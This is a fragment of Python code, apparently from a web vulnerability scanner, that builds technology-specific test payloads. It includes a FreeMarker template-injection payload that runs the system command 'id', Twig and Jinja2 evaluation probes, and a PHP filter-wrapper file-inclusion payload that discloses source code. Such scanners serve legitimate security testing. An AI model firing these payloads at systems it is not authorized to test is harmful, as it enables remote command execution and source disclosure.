            payloads.append(PayloadTemplate(
                name="FreeMarker_Execute_SSTI", vuln_type="ssti_analysis",
                method="GET", url=self._replace_param(url, param_name, '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }'),
                description="FreeMarker Java template utility execution payload",
                severity="critical"
            ))

        # PHP / Laravel / WordPress
        if "php" in tech_str or "laravel" in tech_str or "wordpress" in tech_str:
            payloads.append(PayloadTemplate(
                name="PHP_Smarty_Twig_SSTI", vuln_type="ssti_analysis",
                method="GET", url=self._replace_param(url, param_name, "{{7*7}}"),
                description="PHP Twig/Smarty template evaluation payload",
                severity="critical"
            ))
            payloads.append(PayloadTemplate(
                name="PHP_Filter_Wrapper_LFI", vuln_type="info_disclosure",
                method="GET", url=self._replace_param(url, param_name, "php://filter/convert.base64-encode/resource=index.php"),
                description="PHP Stream Filter Base64 LFI source disclosure probe",
                severity="high"
            ))

        # Python / Flask / Django
        if "python" in tech_str or "flask" in tech_str or "django" in tech_str:
            payloads.append(PayloadTemplate(
                name="Python_Jinja2_SSTI", vuln_type="ssti_analysis",
                method="GET", url=self._replace_param(url, param_name, "{{7*'7'}}"),
                description="Python Jinja2 template multiplication evaluation payload (7777777)",
                severity="critical"
            ))

        return payloads
